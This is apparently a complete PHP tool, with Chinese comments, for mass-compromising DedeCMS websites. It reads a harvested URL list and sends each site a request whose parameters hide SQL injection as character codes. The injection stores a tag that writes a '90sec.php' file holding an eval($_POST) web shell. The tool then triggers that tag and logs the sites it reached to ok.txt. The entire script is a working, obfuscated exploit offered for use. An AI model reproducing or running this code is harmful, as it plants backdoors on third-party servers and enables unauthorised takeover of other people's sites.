<?php 
  
print_r( 
" 
+------------------------------------+ 
DEDECMS批量Getshell工具 
By :Sion
exp: php.exe $argv[0] url.txt 
url.txt是你采集的网址文件！ 
结果保存在ok.txt里面！
+------------------------------------+ 
\r\n\r\n\r\n" 
); 
$filename=$argv[1]; 
if(!file_exists($filename)) echo "采集的文件呢？\r\n"; 
$conts = file_get_contents($filename); 
$arrConts = explode("\n",$conts); 
echo $filename."共有网址".count($arrConts)."个\r\n\r\n\r\n\r\nBingBing~...\r\n";
$arrConts=str_replace(" ","",$arrConts); 
$arrConts=str_replace("\r","",$arrConts); 
$arrConts=str_replace("\n","",$arrConts); 
//print_r($arrConts ); 
for($i=0;isset($arrConts[$i]);$i++){ 
echo $fuck=fuckdede($arrConts[$i]); 
file_put_contents("ok.txt", $fuck,FILE_APPEND);
//复制影牛的采集
} 
  
function fuckdede($sb){ 
$sb=str_replace("http://","",$sb); 
$expp="http://".$sb."/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=51&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96";
$exppp="http://".$sb."/plus/mytag_js.php?aid=9013";
$heade = get_headers($exppp);
$headers=$heade[0];
$head = get_headers($expp);
$header=$head[0];
$test=strpos($header,'200');
$tests=strpos($headers,'200');
if($test || $tests==true){
    return "网址:".$sb."/plus/mytag_js.php?aid=9013"."\r\n--------------------------\r\n"; 
}
}
 
 
  
 
 
  
?>
